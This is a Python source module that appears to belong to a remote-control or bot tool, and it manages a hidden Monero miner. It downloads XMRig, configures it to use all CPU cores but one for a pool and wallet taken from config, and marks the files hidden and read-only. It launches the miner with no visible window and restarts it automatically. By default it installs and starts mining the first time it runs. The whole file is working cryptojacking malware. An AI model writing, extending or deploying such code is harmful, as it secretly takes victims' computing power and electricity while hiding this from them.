import os
import json
import zipfile
import urllib.request
import subprocess
import time
import multiprocessing
import re
from core.config import MINER_WALLET, MINER_POOL, MINER_POOL_TLS, MINER_ALGO, MINER_DIR, STATE_FILE
from core.helpers import kill_xmrig, set_hidden_readonly

_miner_log_callback = None

def set_miner_log_callback(callback):
    global _miner_log_callback
    _miner_log_callback = callback

def _log(msg):
    if _miner_log_callback:
        try:
            _miner_log_callback(msg)
        except:
            pass

def auto_install_xmrig():
    exe_path = os.path.join(MINER_DIR, 'xmrig.exe')
    if os.path.exists(exe_path):
        _log("[MINER] Already installed")
        return True
    _log("[MINER] Downloading XMRig...")
    try:
        os.makedirs(MINER_DIR, exist_ok=True)
        url = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
        zip_path = os.path.join(MINER_DIR, "xmrig.zip")
        urllib.request.urlretrieve(url, zip_path)
        _log("[MINER] Extracting...")
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(MINER_DIR)
        extracted_dir = os.path.join(MINER_DIR, "xmrig-6.22.2")
        if os.path.exists(extracted_dir):
            import shutil
            shutil.move(os.path.join(extracted_dir, "xmrig.exe"), exe_path)
            shutil.rmtree(extracted_dir)
        os.remove(zip_path)

        cpu_count = multiprocessing.cpu_count()
        max_threads = max(1, cpu_count - 1)
        config = {
            "autosave": True,
            "cpu": {"enabled": True, "max-threads-hint": max_threads, "asm": True},
            "pools": [{"algo": MINER_ALGO, "coin": "monero", "url": MINER_POOL, "user": MINER_WALLET, "pass": "x", "tls": MINER_POOL_TLS, "keepalive": True}],
            "print-time": 60
        }
        with open(os.path.join(MINER_DIR, 'config.json'), 'w') as f:
            json.dump(config, f, indent=4)
        set_hidden_readonly(exe_path)
        set_hidden_readonly(os.path.join(MINER_DIR, 'config.json'))
        _log("[MINER] Installation complete.")
        return True
    except Exception as e:
        _log(f"[MINER] Error: {e}")
        return False

def set_miner_auto_start(enabled):
    try:
        with open(STATE_FILE, 'w') as f:
            f.write('1' if enabled else '0')
    except:
        pass

def get_miner_auto_start():
    try:
        with open(STATE_FILE, 'r') as f:
            return f.read().strip() == '1'
    except:
        return False

def start_miner():
    exe = os.path.join(MINER_DIR, 'xmrig.exe')
    cfg = os.path.join(MINER_DIR, 'config.json')
    if not os.path.exists(exe):
        if not auto_install_xmrig():
            return "[!] XMRig not found and auto-install failed."
    _log("[MINER] Killing existing process...")
    kill_xmrig()
    log_file = os.path.join(MINER_DIR, 'xmrig.log')
    if os.path.exists(log_file):
        try:
            os.remove(log_file)
        except:
            pass
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0
    _log("[MINER] Starting XMRig...")
    with open(log_file, 'w') as lf:
        subprocess.Popen([exe, '-c', cfg], stdout=lf, stderr=lf, startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW)
    time.sleep(2)
    set_miner_auto_start(True)
    _log("[MINER] Miner started (auto-restart enabled).")
    return "[+] Miner started (auto-restart enabled)."

def stop_miner():
    kill_xmrig()
    set_miner_auto_start(False)
    _log("[MINER] Miner stopped.")
    return "[+] Miner stopped."

def miner_status():
    log_file = os.path.join(MINER_DIR, 'xmrig.log')
    if not os.path.exists(log_file):
        return "[!] Log not found. Miner may not be running."
    with open(log_file, 'r', errors='ignore') as f:
        lines = f.readlines()
    if not lines:
        return "[!] Empty log."
    hashrate = "N/A"
    accepted = 0
    for line in lines[-30:]:
        if 'speed' in line.lower():
            match = re.search(r'speed\s+\S+\s+(\d+(?:\.\d+)?)\s+([KMG]?H/s)', line, re.I)
            if match:
                hashrate = match.group(1) + " " + match.group(2)
        if 'accepted' in line.lower():
            accepted += 1
    proc = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq xmrig.exe'], capture_output=True, text=True)
    running = 'xmrig.exe' in proc.stdout
    return f"Status: {'✅ Running' if running else '❌ Stopped'}\nInstallation: {MINER_DIR}\nWallet: {MINER_WALLET}\nPool: {MINER_POOL}\nHashrate: {hashrate}\nAccepted shares: {accepted}"

def miner_log(lines=30):
    log_file = os.path.join(MINER_DIR, 'xmrig.log')
    if not os.path.exists(log_file):
        return "[!] Log not found."
    with open(log_file, 'r', errors='ignore') as f:
        all_lines = f.readlines()
    if not all_lines:
        return "[!] Empty log."
    return ''.join(all_lines[-lines:])

def ensure_miner():
    if not os.path.exists(STATE_FILE):
        auto_install_xmrig()
        start_miner()
    elif get_miner_auto_start():
        auto_install_xmrig()
        start_miner()